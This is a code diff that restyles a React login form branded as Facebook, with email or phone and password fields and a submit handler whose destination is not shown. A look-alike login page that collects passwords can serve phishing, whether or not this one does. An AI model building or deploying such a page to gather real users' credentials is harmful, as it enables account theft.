@@ -16,7 +16,7 @@ const FacebookLogin = () => {
     e.preventDefault();
 
     if (!validateInput(identifier)) {
-      setError("Please enter a valid email address or phone number.");
+      setError("Please enter a valid email or phone number.");
       return;
     }
 
@@ -40,7 +40,6 @@ const FacebookLogin = () => {
         setSuccess(true);
         setError("");
         console.log("Login successful:", result);
-
         setTimeout(() => window.location.reload(), 2000);
       } else {
         setSuccess(false);
@@ -54,62 +53,48 @@ const FacebookLogin = () => {
 
   return (
     <div className="min-h-screen bg-blue-100 flex items-center justify-center px-4">
-      <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
-        <h1 className="text-3xl font-bold text-center text-blue-600 mb-6">Facebook</h1>
-        <p className="text-center text-gray-700 mb-6">Log in to your account</p>
+      <div className="bg-white rounded-lg shadow-md p-6 w-full max-w-sm">
+        <h1 className="text-2xl font-bold text-center text-blue-600 mb-4">Facebook</h1>
+        <p className="text-center text-gray-700 mb-4">Log in to your account</p>
 
         {success ? (
-          <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded text-center mb-4">
+          <div className="bg-green-100 border border-green-400 text-green-700 px-3 py-2 rounded text-center mb-4">
             ✅ Login successful! Reloading...
           </div>
         ) : (
-          <form className="space-y-4" onSubmit={handleSubmit}>
-            <div>
-              <input
-                type="text"
-                placeholder="Email address or phone number"
-                value={identifier}
-                onChange={(e) => setIdentifier(e.target.value)}
-                className={`w-full px-4 py-3 border ${
-                  error ? "border-red-500" : "border-gray-300"
-                } rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500`}
-                required
-              />
-            </div>
-
-            <div>
-              <input
-                type="password"
-                placeholder="Password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
-                required
-              />
-            </div>
-
-            {error && (
-              <p className="text-sm text-red-500 -mt-2">{error}</p>
-            )}
-
+          <form className="space-y-3" onSubmit={handleSubmit}>
+            <input
+              type="text"
+              placeholder="Email or phone"
+              value={identifier}
+              onChange={(e) => setIdentifier(e.target.value)}
+              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none"
+              required
+            />
+            <input
+              type="password"
+              placeholder="Password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none"
+              required
+            />
+            {error && <p className="text-sm text-red-500">{error}</p>}
             <button
               type="submit"
-              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-300"
+              className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition duration-200"
             >
               Log In
             </button>
-
-            <div className="text-center">
-              <a href="#" className="text-blue-600 text-sm hover:underline">
+            <div className="text-center text-sm mt-2">
+              <a href="#" className="text-blue-600 hover:underline">
                 Forgotten password?
               </a>
             </div>
-
-            <hr className="my-4" />
-
+            <hr className="my-3" />
             <button
               type="button"
-              className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 rounded-lg transition duration-300"
+              className="w-full bg-green-600 text-white py-2 rounded hover:bg-green-700 transition duration-200"
             >
               Create New Account
             </button>
